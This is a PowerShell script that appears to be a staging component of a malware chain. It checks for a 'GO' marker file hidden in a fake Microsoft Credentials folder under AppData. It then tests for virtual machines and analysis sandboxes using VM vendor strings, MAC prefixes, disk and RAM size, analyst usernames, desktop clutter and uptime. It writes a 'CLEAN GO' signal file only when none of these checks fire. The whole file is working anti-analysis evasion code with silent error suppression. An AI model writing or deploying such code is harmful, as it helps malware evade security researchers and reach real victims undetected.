# sandbox.ps1 - Read power.txt, check GO, check sandbox, drop box.txt

$ErrorActionPreference = 'SilentlyContinue'
$appData = [System.IO.Path]::GetFolderPath('ApplicationData')
$desktop = [System.Environment]::GetFolderPath('Desktop')
$powerPath = "$appData\Microsoft\Credentials\power.txt"
$boxPath = "$appData\Microsoft\Credentials\box.txt"

# Find power.txt
$locations = @($powerPath, "$desktop\power.txt", "$env:TEMP\power.txt")
$found = $false

foreach ($loc in $locations) {
    if (Test-Path $loc) {
        $content = [System.IO.File]::ReadAllText($loc, [System.Text.Encoding]::UTF8)
        if ($content -match "GO") {
            $found = $true
            break
        }
    }
}

if (-not $found) { exit }

# Sandbox Detection
$sandbox = $false

# Check 1: VM artifacts
$vmIndicators = @("VMware","VirtualBox","VBox","Hyper-V","QEMU","Xen","Parallels","Sandboxie","Cuckoo","JoeBox")
foreach ($ind in $vmIndicators) {
    if ((Get-WmiObject Win32_ComputerSystem).Model -match $ind) { $sandbox = $true }
    if ($env:PROCESSOR_IDENTIFIER -match $ind) { $sandbox = $true }
}

# Check 2: MAC address
$mac = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).MacAddress
$vmMACs = @("00:0C:29","00:50:56","08:00:27","00:03:FF","00:1C:42","00:16:3E")
foreach ($v in $vmMACs) {
    if ($mac -match $v) { $sandbox = $true }
}

# Check 3: Disk size (small = likely VM)
$disk = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size
if ($disk -lt 80GB) { $sandbox = $true }

# Check 4: RAM (low = likely VM)
$ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
if ($ram -lt 4GB) { $sandbox = $true }

# Check 5: Username
$users = @("sandbox","malware","virus","test","maltest","john","wine","cuckoo","virustotal")
foreach ($u in $users) {
    if ($env:USERNAME -match $u) { $sandbox = $true }
}

# Check 6: Recent files count (too clean = VM)
$recentCount = (Get-ChildItem "$env:USERPROFILE\Desktop" -ErrorAction SilentlyContinue).Count
if ($recentCount -lt 3) { $sandbox = $true }

# Check 7: Uptime (fresh install = suspicious)
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$days = ((Get-Date) - $uptime).Days
if ($days -lt 1) { $sandbox = $true }

# If no sandbox, drop box.txt with GO
if (-not $sandbox) {
    $boxText = "CLEAN`nGO"
    try {
        $dir = Split-Path $boxPath -Parent
        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        [System.IO.File]::WriteAllText($boxPath, $boxText, [System.Text.Encoding]::UTF8)
    } catch {
        $boxPath = "$desktop\box.txt"
        [System.IO.File]::WriteAllText($boxPath, $boxText, [System.Text.Encoding]::UTF8)
    }
}
